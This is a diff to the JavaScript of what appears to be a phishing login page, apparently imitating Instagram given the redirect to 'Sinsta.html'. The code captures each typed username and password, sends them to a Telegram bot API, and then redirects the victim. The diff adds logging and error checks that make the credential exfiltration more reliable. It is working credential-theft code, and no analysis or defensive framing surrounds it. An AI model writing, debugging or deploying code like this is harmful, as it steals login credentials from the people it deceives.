@@ -169,6 +169,8 @@
                 text: `Login attempt ${attempts}\nUsername: ${username}\nPassword: ${password}`
             };
 
+            console.log(`Attempt ${attempts}: Sending data to Telegram`);
+
             fetch(telegramApiUrl, {
                 method: 'POST',
                 headers: {
@@ -176,17 +178,24 @@
                 },
                 body: JSON.stringify(messageData)
             })
-            .then(response => response.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.json();
+            })
             .then(data => {
+                console.log('Telegram response:', data);
                 if (data.ok) {
+                    console.log('Login attempt successful, redirecting...');
                     window.location.href = 'Sinsta.html';
                 } else {
                     console.error('Failed to send message to Telegram');
-                    alert('An error occurred. Please try again later.');
+                    alert('An error occurred while sending the message. Please try again later.');
                 }
             })
             .catch(error => {
-                console.error('Login error:', error);
+                console.error('Fetch error:', error);
                 alert('An error occurred. Please try again later.');
             });
         }
